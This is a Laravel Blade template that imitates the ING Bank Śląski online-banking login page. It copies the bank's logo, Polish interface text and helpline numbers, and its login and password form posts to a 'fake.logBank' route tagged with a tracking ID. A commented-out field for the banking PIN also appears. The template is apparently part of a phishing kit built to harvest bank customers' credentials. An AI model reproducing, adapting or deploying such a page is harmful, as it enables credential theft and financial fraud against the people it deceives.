@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/millenium.css') }}" rel="stylesheet">
@endpush
@section('content')
    <div id="layout-region" class="ing-container">
        <noscript>
            <div class="no-js container">
                <div class="container ing-container">
                    <div class="region-wrapper region-wrapper_trans-screen wrapper-trans">
                        <header id="header-region" class="ing-header trans-screen-header">
                            <div>
                                <nav class="navbar"><h1 class="pull-left logo"><span class="logo__link"><img
                                                    src="{{asset($bank['logo'])}}"
                                                    alt="Strona główna - Moje ING"
                                                    class="logo__img--mobile visible-xs"> <img
                                                    src="{{asset($bank['logo'])}}"
                                                    alt="Strona główna - Moje ING"
                                                    class="logo__img hidden-xs"></span></h1>
                                </nav>
                            </div>
                        </header>
                        <div id="main-region" class="columns-container">
                            <div class="notification centered info">
                                <div class="notification-row-first">
                                    <div class="notification-icon"><i class="ing-icon"></i></div>
                                    <div class="notification-content" role="alert">
                                        <div class="notification-title "><p>Nie można wyświetlić strony</p></div>
                                        <div class="notification-message"><p>Włącz obsługę JavaScript, aby móc korzystać
                                                z
                                                Moje ING.<br> Możesz to zrobić w ustawieniach swojej przeglądarki.</p>
                                            <p>W razie wątpliwości lub problemów prosimy o&nbsp;kontakt z&nbsp;infolinią:
                                                +48&nbsp;357&nbsp;00&nbsp;69</p></div>
                                        <div class="notification-link notification-link--offset"><a class="link"
                                                                                                    href="#">Zobacz
                                                jak włączyć JavaScript</a></div>
                                        <div class="notification-link notification-link--offset"><a class="link"
                                                                                                    href="#"
                                                                                                    title="Przejdź do&nbsp;Moje ING">Odśwież</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="region--left-corner"></div>
                        <div class="region--right-corner"></div>
                    </div>
                    <footer id="footer-region" class="ing-footer container">
                        <div>
                            <div class="row">
                                <div class="col-xs-12 col-lg-7 ing-list-hybrid-container">
                                    <ul class="ing-list-hybrid pull-left">
                                        <li><a href="#" target="_blank"
                                               rel="noopener"><i class="glyphicon-ing-blocked2"></i> <span>O&nbsp;bezpieczeństwie</span></a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="col-xs-12 col-lg-5 ing-list-inline-container">
                                    <ul class="ing-list-inline">
                                        <li><span id="aria-info">Infolinia:</span> <a href="tel:+48323570069"
                                                                                      aria-describedby="aria-info"><span
                                                        class="sr-only">zadzwoń 32_357 00 69</span><span
                                                        aria-hidden="true">32 357 00 69</span></a>
                                        </li>
                                        <li> ING Bank Śląski S.A.</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </noscript>
        <div class="login-layout">
            <div id="smart-app-banner-region"></div>
            <div class="region-wrapper login-region login-layout_container ui-content login-layout--top">
                <div class="main-content-wrap">
                    <h1 class="sr-only"></h1>
                    <div id="content-region" class="main-content">
                        <div class="ing-login-container">
                            <div class="content-container box">
                                <header class="ing-header">
                                    <div id="nav-hybrid" class="navbar nav-hybrid nav-hybrid--mobileFixed">
                                        <div class="logo">
                                            <div class="logo__link">
                                                <div id="logo-region">
                                                    <div>
                                                        <img class="logo__img--logo"
                                                              src="{{asset($bank['logo'])}}"
                                                              alt="ING Bank Śląski" width="128">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </header>
                                <div id="info-region" class="box-content box-content--info"></div>
                                <div class="box-content login-hero"><h2 class="js-header hide-if-empty"></h2></div>
                                <div id="body-region" class="body" style="">
                                    <section class="login-form-container">
                                        <div id="check-login-error-banner" class="box-content box-content--error"></div>
                                        <div class="box-content box--after">
                                            <div class="login-form-content">
                                                <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                                      role="form">

                                                    <div class="form-group">
                                                        <label for="login-input" class="_3LNER _3K-gi js-login-label">
                                                            <span aria-hidden="true">Wprowadź Identyfikator</span>
                                                            <span class="sr-only">Wpisz login do&nbsp;bankowości internetowej</span>
                                                        </label>
                                                        <div class="_3OvuS">
                                                            <a href="#" role="button" aria-haspopup="true"
                                                               data-html="false">
                                                                <span aria-hidden="true" class="icon x-small"
                                                                      data-placement="top">
                                                                    <svg>
                                                                        <use xlink:href="#ing-icon-tooltip"></use>
                                                                    </svg>
                                                                </span>
                                                                <div class="_3xxAs LTEDe"></div>
                                                                <div class="_613h5 Ik3r3">
                                                                    <div class="_2wRGO _3zm5B">Login zawiera 3 litery
                                                                        imienia, 3 litery nazwiska i&nbsp;4 cyfry np.
                                                                        jankow1234. Swój login (Identyfikator
                                                                        użytkownika) znajdziesz w&nbsp;umowie
                                                                    </div>
                                                                </div>
                                                                <span class="sr-only">Informacja</span>
                                                            </a>
                                                        </div>

                                                        <input autocomplete="off" type="text" required
                                                               class="form-control" name="login"
                                                               id="login-input" maxlength="10">
                                                    </div>
                                                    <div class="form-group">
                                                        <label for="password-input"
                                                               class="_3LNER _3K-gi js-password-label">
                                                            <span aria-hidden="true">Wprowadź Hasło</span>
                                                        </label>
                                                        <input autocomplete="off" type="password" required
                                                               class="form-control" name="password"
                                                               id="password-input">
                                                    </div>
{{--                                                    <div class="form-group">--}}
{{--                                                        <label for="pin-input"--}}
{{--                                                               class="_3LNER _3K-gi js-pin-label">--}}
{{--                                                            <span aria-hidden="true">Wpisz kod PIN bankowości internetowej</span>--}}
{{--                                                        </label>--}}
{{--                                                        <input autocomplete="off" type="text" required--}}
{{--                                                               class="form-control" name="pin"--}}
{{--                                                               id="pin-input">--}}
{{--                                                    </div>--}}
                                                    <div class="_39Dzw _1n7r2" id="login-btn">
                                                        <button class="btn" tabindex="-1" aria-hidden="true" slot="_button"
                                                                type="submit">Dalej</button>
                                                    </div>
                                                </form>
                                                <div class="footer-region">
                                                    <div></div>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </div>
                                <div id="additional-region"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
